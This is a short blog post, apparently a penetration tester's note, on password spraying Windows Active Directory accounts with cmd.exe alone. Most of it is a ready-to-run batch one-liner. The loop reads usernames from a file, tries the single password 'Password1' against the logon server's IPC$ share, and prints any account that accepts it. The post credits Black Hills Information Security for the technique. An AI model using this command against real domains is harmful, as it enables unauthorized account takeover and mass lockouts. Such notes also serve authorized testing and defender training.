---
layout: single
classes: wide
author_profile: true
read_time: true
share: true
related: true
title:  "Internal Infrastructure Pentest - Password Spraying With CMD"
date:   2019-06-22 15:49:00 +1000
categories:
  - Internal Pentest
  - Internal Infrastructure Pentest
  - Network Pentest
tags:
  - Password
  - Password Spraying
  - Spraying
  - Intial Foothold
  - Windows Security
  - Hash Cracking
  - Active Directory Hacking
---


- Password Spraying: It is a technique of trying one password across all the domain users. 
<pre>
- No tool needed. One can perform password spraing using cmd.exe
  - net use %LOGONSERVER%\IPC$ /delete
  - set PASSWORD=Password1
  - FOR /F %n in (Documents\users.txt) DO @((net use %LOGONSERVER%\IPC$ /user:%USERDOMAIN%\%n %PASSWORD%
    1>NUL 2>&1 && echo. && echo [*] %n:%PASSWORD% && net use /delete %LOGONSERVER%\IPC$  > NUL) || < set /p =.)
    
    
   <b> Thanks to : Black Hills Information Security (https://www.blackhillsinfosec.com/) </b>
</pre>
